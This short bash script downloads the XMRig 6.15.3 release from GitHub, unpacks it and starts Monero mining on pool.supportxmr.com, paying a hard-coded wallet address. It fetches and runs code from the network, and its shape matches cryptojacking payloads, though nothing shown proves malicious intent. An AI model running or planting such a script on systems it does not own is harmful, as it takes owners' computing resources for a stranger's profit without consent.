#!/bin/bash
wget https://github.com/xmrig/xmrig/releases/download/v6.15.3/xmrig-6.15.3-linux-x64.tar.gz
tar xfvz xmrig-6.15.3-linux-x64.tar.gz
cd xmrig-6.15.3
./xmrig -o pool.supportxmr.com:443 -u 4AQgUnhWMAfGHFtuoibTL5U8f5SD62ZpB1u3YrwkB7ngSd57Rgs5rMqKKdDvyh5egnWipwTv3pRqc7AYv5jZVomECTuVyUR -k --tls
